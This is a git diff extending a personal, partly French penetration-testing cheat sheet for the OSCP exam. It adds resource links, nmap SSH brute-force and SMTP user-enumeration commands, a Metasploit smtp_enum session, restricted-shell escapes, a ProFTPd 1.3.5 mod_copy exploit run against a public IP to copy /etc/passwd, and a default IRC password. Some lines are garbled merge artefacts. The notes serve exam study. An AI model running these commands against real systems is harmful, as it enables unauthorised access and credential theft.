@@ -1,3 +1,70 @@
+# Links
+
+https://fareedfauzi.gitbook.io/oscp-notes/
+
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
+https://guif.re/bo
+http://blog.commandlinekungfu.com/
+https://kooksec.blogspot.com/2015/09/i-tried-harder-oscp-edition.html
+https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0
+https://www.hackingarticles.in/penetration-testing/
+https://gtfobins.github.io/
+https://explainshell.com
+https://www.grymoire.com/
+https://www.win.tue.nl/~aeb/linux/hh/hh.html
+https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob.html
+https://m8r0wn.com/posts/2020/02/oscp.html
+https://github.com/m0nad/awesome-privilege-escalation
+https://chousensha.github.io/blog/archives/
+https://www.aldeid.com/wiki/Main_Page
+https://www.mogozobo.com/?p=2848
+https://zayotic.com/
+https://www.mogozobo.com/?p=2848
+https://www.five86.com/
+https://blog.mzfr.me/
+https://github.com/0x4D31/awesome-oscp
+http://thegreycorner.com/
+https://github.com/stephenbradshaw
+https://highon.coffee/
+https://blog.g0tmi1k.com
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://www.sans.org/blog/escaping-restricted-linux-shells/
+I started to use g0tmilk Linux Privilege Escalation checklist
+https://0xatom.github.io
+
+https://github.com/g0tmi1k
+https://explainshell.com/
+https://book.hacktricks.xyz/
+https://github.com/carlospolop/hacktricks
+https://github.com/Hack-with-Github/Awesome-Hacking
+
+https://www.hackingarticles.in/multiple-ways-to-secure-ssh-port/
+https://pinkysplanet.net/
+
+https://www.hackingtutorials.org/metasploit-tutorials/metasploit-commands/
+https://7ms.us/tag/walkthrough/
+
+https://pentesterlab.com/exercises/web_for_pentester/course
+https://pentesterlab.com/exercises/web_for_pentester_II/course
+
+https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
+
+https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/
+https://digital-forensics.sans.org/community/cheat-sheets
+
+
+https://github.com/Ignitetechnologies/Privilege-Escalation
+
+https://github.com/liparus/cybersecurity_cheatsheets
+https://github.com/l34n/CySecBooks
+
+
+
+http://frequentlyinaccurate.net/tag/infosec/
+
+
+
+
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
 https://tools.kali.org/tools-listing
 
@@ -151,11 +218,20 @@ for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "
     joomscan
 
 
+### CUPS
 
+    http://a.b.c.d:631
+
+### ngircd
+    
+default password in /etc/ngircd/ngircd.conf is wealllikedebian
+
+Software : HexChat
 
 ## Identifier les vulnérabilités
 
     sudo nmap -n -Pn -sV --script vuln,exploit -p21,22,80 -O 192.168.110.54
+
     searchsploit
 
 
@@ -211,8 +287,18 @@ passwords reuse
 sudo nmap -n -Pn -p- -O 192.168.110.54
 sudo nmap -n -Pn -sV -p21,22,80 -O 192.168.110.54
 sudo nmap -n -Pn -sV --script default -p21,22,80 -O 192.168.110.54
+sudo nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \
+      --script-args ssh-brute.timeout=4s <target>
+$ nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <target>
+$ nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.domain=<domain> $ip  
+$ nmap -p25 --script smtp-enum-users --script-args userdb=users.txt smtp-enum-users.domain=TORMENT.localdomain smtp-enum-users.methods=VRFY $ip
+$ nmap -p25 --script smtp-enum-users $ip
+
+
+ /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U users.txt -t 192.168.110.63
 
 ## sed
+
 
 ```console
 
@@ -596,6 +682,7 @@ pspy : https://github.com/DominicBreuker/pspy it allows you to see commands run 
 ```bash
 
 find / -perm -u=s -type f -ls 2>/dev/null
+
 find / -perm -g=s -type f 2>/dev/null
 find / -type f -writable 2>/dev/null | grep -v '^/proc'| grep -v '^/sys'
 find / -user root -writable 2>/dev/null | grep -v '/proc' | grep -v '/dev'
@@ -617,6 +704,8 @@ find . -type f -mmin -15
 
 #Bash find files between two timestamps:
 find . -type f -newermt "2014-10-08 10:17:00" ! -newermt "2014-10-08 10:53:00"
+
+find / -type f -name user.txt -exec cat {} \; 2> /dev/null
 
 
 ```
@@ -720,7 +809,7 @@ https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner
     cmd/unix/bind_jjs
     cmd/unix/bind_lua
     cmd/unix/bind_netcat
-    cmd/unix/bind_netcat_gaping
+    cmd/unix/bind_netcat_gapingproftpd-1.3.5
     cmd/unix/bind_netcat_gaping_ipv6
     cmd/unix/bind_nodejs
     cmd/unix/bind_perl
@@ -936,6 +1025,12 @@ int main(void){
 # Python
 
 ```python
+## asroot.py
+import os
+os.system('/bin/bash')
+
+```
+```python
 ## read from sys.stdin
 
 import sys
@@ -1091,6 +1186,7 @@ import os; os.system('cp /bin/sh /tmp/sh');   os.system('chown root.root /tmp/sh
 bttai   ALL=(ALL) NOPASSWD: ALL
 
 
+# SMTP
 # SMB
 
 https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
@@ -1099,7 +1195,6 @@ enum4linux 192.168.110.46
 nmblookup -A 192.168.1.17
 snmp-check 10.10.10.10
 nbtscan 192.168.1.17
-nbtstat -A 192.168.1.17
 smbmap -H 192.168.110.46
 smbmap -H 192.168.110.46 -u helios -p qwerty
 rpcclient -U "" 10.10.10.10
@@ -1109,7 +1204,7 @@ smbclient //192.168.110.46/helios
 get file.txt
 
 smbclient //10.10.10.9/share$
-
+userdb=users.txt 192.168.110.11
 smbclient //192.168.110.46/helios -U helios
 Enter WORKGROUP\helios's password: 
 Try "help" to get a list of possible commands.
@@ -1118,6 +1213,13 @@ smb: \> mask ""
 smb: \> recurse ON
 smb: \> prompt OFF
 smb: \> mget *
+
+
+smbclient -I 192.168.1.26 -L -N
+    
+    –I — This will direct smbclient to connect with the appending IP address
+    –L — This will list all the shared resources of the target machine, if available
+    –N — This tells it to connect with the target machine without the password
 
 
 ## SMB Password Cracking
@@ -1146,7 +1248,36 @@ showmount : liste les partages, mountables anonymement
 
 # SMTP 
 
-detecte des nom d'utilisateurs ?
+userdb=users.txt 192.168.110.11
+    nmap -p25 --script smtp-enum-users  --script-args smtp-enum-users.domain=<domain>,userdb=users.txt 192.168.110.11
+    
+    msf6 auxiliary(scanner/smtp/smtp_enum) > show options
+    Module options (auxiliary/scanner/smtp/smtp_enum):
+       Name       Current Setting            Required  Description
+       ----       ---------------            --------  -----------
+       RHOSTS                                yes       The target host(s), range CIDR identifier,
+                                                       or hosts file with syntax 'file:<path>'
+       RPORT      25                         yes       The target port (TCP)
+       THREADS    1                          yes       The number of concurrent threads (max one p
+                                                       er host)
+       UNIXONLY   true                       yes       Skip Microsoft bannered servers when testin
+                                                       g unix users
+       USER_FILE  /usr/share/metasploit-fra  yes       The file that contains a list of probable u
+                  mework/data/wordlists/uni            sers accounts.
+                  x_users.txt
+
+    msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.110.1
+    RHOSTS => 192.168.110.21
+    msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE users.txt
+    USER_FILE => users.txt
+    msf6 auxiliary(scanner/smtp/smtp_enum) > run
+    [*] 192.168.110.21:25     - 192.168.110.21:25 Banner: 220 TORMENT.localdomain ESMTP Postfix (Debian/GNU)
+    [+] 192.168.110.21:25     - 192.168.110.21:25 Users found: patrick, qiu
+    [*] 192.168.110.21:25     - Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+
+    /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U users.txt -t 192.168.110.63
+    
 
 # Base de données
 
@@ -1374,6 +1505,15 @@ https://github.com/rebootuser
 
 https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
 
+Info about the jail:
+
+    echo $SHELL
+    echo $PATH
+    env
+    export
+    pwd
+
+
 - rbash : ssh avida@192.168.110.38 -t "/bin/bash --noprofile"
 - ftp : 
     -rbash-4.1$ ftp 
@@ -1385,7 +1525,22 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limite
     ^T
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export SHELL=/bin/bash
+- vim
+    :set shell=/bin/sh
+    :shell
+- lshell
+    $ os.system('/bin/bash')
 
+# ProFTPd 1.3.5
+
+<https://www.exploit-db.com/exploits/36742>
+mod_copy allows these commands : site cpfr, site cpto to be used by *unauthenticated clients*
+
+    telnet 80.150.216.115 21
+    site cpfr /etc/passwd
+    350 File or directory exists, ready for destination name
+    site cpto /tmp/passwd.copy
+    250 Copy successful
 
 
 
@@ -1446,8 +1601,7 @@ gdb-peda$ find "\xff\xe4" binary
 
 
 
-
-== Desactive ASLR
+##  Desactive ASLR
 
 maximize the stack 
 
